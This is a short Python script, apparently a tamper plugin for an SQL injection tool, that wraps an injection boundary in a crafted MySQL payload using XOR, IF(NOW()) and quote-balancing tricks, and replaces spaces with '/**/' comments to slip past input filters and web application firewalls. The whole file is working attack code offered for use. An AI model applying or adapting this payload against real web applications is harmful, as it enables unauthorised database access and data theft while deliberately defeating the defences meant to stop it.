#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org


def do(strings):
    strings = strings.replace(' ','/**/')
    return strings

def tamper(boundary,query):
    # print 'tamper'
    boundary = "a' XOR(if(now(),0,0))OR'1'AND({bou})ANd '8'='8".format(bou=boundary)
    boundary = do(boundary)
    query = do(query)
    return  boundary,query